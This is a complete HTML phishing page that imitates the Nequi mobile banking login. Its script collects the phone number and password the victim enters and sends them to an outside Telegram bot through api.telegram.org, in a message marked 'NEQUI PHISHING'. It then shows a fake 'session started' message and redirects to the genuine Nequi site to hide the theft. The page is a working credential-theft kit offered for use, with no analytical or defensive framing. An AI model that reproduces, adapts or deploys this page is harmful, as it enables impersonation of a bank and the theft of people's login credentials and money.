<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi | Inicia sesión</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #00b14f, #008f3f); height:100vh; display:flex; align-items:center; justify-content:center; }
        .container { background:white; width:90%; max-width:380px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.2); overflow:hidden; }
        .header { background:#00b14f; color:white; text-align:center; padding:25px 0; }
        .header img { width:80px; }
        .content { padding:30px 25px; }
        h2 { text-align:center; color:#333; margin-bottom:25px; font-size:18px; }
        input { width:100%; padding:14px; margin:10px 0; border:1px solid #ddd; border-radius:8px; font-size:16px; }
        button { width:100%; padding:14px; background:#00b14f; color:white; border:none; border-radius:8px; font-size:17px; font-weight:500; margin-top:15px; cursor:pointer; }
        button:hover { background:#008f3f; }
        .footer { text-align:center; padding:20px; color:#666; font-size:14px; }
        .error { color:red; text-align:center; margin:10px 0; display:none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            
        </div>
        <div class="content">
            <h2>Inicia sesión en tu cuenta Nequi</h2>
            
            <form id="loginForm">
                <input type="tel" id="phone" placeholder="Número de celular (10 dígitos)" maxlength="10" required>
                <input type="password" id="password" placeholder="Contraseña" required>
                <div class="error" id="errorMsg">Número o contraseña incorrectos</div>
                <button type="submit">Ingresar</button>
            </form>
            
            <p style="text-align:center; margin-top:20px; color:#00b14f; font-size:14px;">
                ¿Olvidaste tu contraseña?
            </p>
        </div>
        <div class="footer">
            Nequi © 2025 - Todos los derechos reservados
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');

            if (phone.length < 10 || password.length < 4) {
                errorMsg.style.display = 'block';
                return;
            }

            // Enviar a tu Telegram
           const botToken = "773351137:AAH8z8z8z8z8z8z8z8z8z8z8z8z8z8z8z";
           const chatId = "773351137";

            
            const message = `🔴 NEQUI PHISHING\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(() => {
                errorMsg.style.color = 'green';
                errorMsg.textContent = '✅ Sesión iniciada correctamente';
                errorMsg.style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = "https://www.nequi.com.co";
                }, 2000);
            })
            .catch(() => {
                window.location.href = "https://www.nequi.com.co";
            });
        });
    </script>
</body>
</html>
